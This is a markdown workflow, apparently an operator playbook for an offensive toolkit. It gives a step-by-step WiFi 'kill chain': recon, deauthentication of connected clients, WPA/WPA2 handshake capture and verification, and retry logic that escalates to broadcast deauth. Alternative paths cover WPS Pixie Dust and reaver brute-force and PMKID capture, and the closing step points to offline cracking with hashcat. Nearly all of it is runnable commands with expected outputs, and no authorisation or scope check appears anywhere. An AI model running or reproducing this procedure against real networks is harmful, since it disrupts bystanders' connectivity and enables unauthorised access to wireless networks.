# Workflow: WiFi Deauth + Handshake Capture Kill Chain

**ID:** 01_wifi_killchain
**Risk Level:** HIGH — Active attack, requires monitor mode, disrupts target connectivity
**Estimated Duration:** 5-30 minutes per target
**Requires:** Root privileges, monitor-mode capable WiFi adapter

## Objective

Capture a WPA/WPA2 handshake from a target AP by deauthenticating connected clients and capturing the re-authentication handshake.

## Pre-Flight Checks

1. **Monitor mode interface exists:**

    ```bash
    cat /sys/class/net/wlan0mon/type  # Should output 803
    ```

    If not: `sudo airmon-ng start wlan0`

2. **Target AP identified:**

    ```bash
    npx tsx tactical/modules/module_runner.ts wifi_recon --type ap --min-signal -70
    ```

    Select target with strongest signal and most connected clients.

3. **Verify aircrack-ng suite:**
    ```bash
    which aireplay-ng && which wifite
    ```

## Steps

### Step 1: Enumerate Target AP

```bash
npx tsx tactical/modules/module_runner.ts wifi_recon --type ap --ssid "<TARGET_SSID>" --min-signal -75
```

**Record:** BSSID, channel, encryption type, connected client count.
**Abort if:** Target not found or signal < -80 dBm (too far away).

### Step 2: Identify Connected Clients

```bash
npx tsx tactical/modules/module_runner.ts wifi_recon --type client --max-age 300
```

**Record:** Client MACs associated with the target BSSID.
**If 0 clients:** Wait 2 minutes and retry. If still 0, send broadcast deauth (Step 3 without --client).

### Step 3: Deauthentication Attack

```bash
npx tsx tactical/modules/module_runner.ts wifi_deauth \
  --bssid <TARGET_BSSID> \
  --client <CLIENT_MAC> \
  --interface wlan0mon \
  --count 10
```

**Expected:** `frames_sent > 0` in output.
**If "not in monitor mode" error:** Re-run `sudo airmon-ng start wlan0` and retry.
**If 0 frames sent:** Increase count to 30, try broadcast (omit --client).

### Step 4: Handshake Capture

Start handshake capture immediately after (or concurrently with) deauth:

```bash
npx tsx tactical/modules/module_runner.ts wifi_handshake \
  --bssid <TARGET_BSSID> \
  --interface wlan0 \
  --channel <CHANNEL> \
  --timeout 180
```

**Expected:** `handshake_file` path in output with `file_size_bytes > 0`.
**If no handshake captured:** Go to Retry Logic.

### Step 5: Verify Handshake

```bash
aircrack-ng -w /dev/null <HANDSHAKE_FILE> 2>&1 | grep "1 handshake"
```

**Expected:** Output confirms "1 handshake" captured.
**If invalid:** Delete file and go to Retry Logic.

## Retry Logic

**Retry Limit:** 3 attempts total.

1. **Re-check target visibility:** Run Step 1 again. If target gone, abort.
2. **Increase deauth intensity:** Double the frame count (10 → 20 → 40).
3. **Try broadcast deauth:** Remove --client flag to deauth all clients.
4. **Switch client:** If targeting a specific client failed, try a different one.
5. **Re-enable monitor mode:** `sudo airmon-ng check kill && sudo airmon-ng start wlan0`

## Abort Conditions

- 3 consecutive failures at any step
- Target AP no longer visible (moved out of range)
- Operator interrupt (Ctrl+C)
- Interface disappears (adapter unplugged)
- `wifite` reports "no targets found" 3 times

## Alternative Paths

### Path A: WPS PIN Attack (if WPS enabled)

Before deauth, check if WPS is enabled — it's often a faster path:

```bash
# Discover WPS-enabled APs
npx tsx tactical/modules/module_runner.ts wps_attacker \
  --tool wash --interface wlan0mon --duration 30
```

If target has WPS enabled and not locked:

```bash
# Try Pixie Dust first (seconds vs hours)
npx tsx tactical/modules/module_runner.ts wps_attacker \
  --tool reaver --bssid <BSSID> --interface wlan0mon --pixie-dust

# If Pixie Dust fails, try online brute-force (slow)
npx tsx tactical/modules/module_runner.ts wps_attacker \
  --tool reaver --bssid <BSSID> --interface wlan0mon --timeout 3600
```

### Path B: PMKID Capture (clientless)

If no clients are connected, try PMKID capture — no deauth needed:

```bash
npx tsx tactical/modules/module_runner.ts wifi_capture \
  --interface wlan0mon --filter-bssid <BSSID> --duration 120
```

If `pmkid_count > 0`, the hash file is ready for offline cracking.

## Reporting

Summarize:

- Target AP: BSSID, SSID, channel, encryption
- Deauth frames sent (total across attempts)
- Handshake captured: yes/no
- PMKID captured: yes/no
- WPS PIN found: yes/no
- Handshake/hash file path
- Time to capture
- Recommended next step: offline cracking with hashcat/aircrack-ng
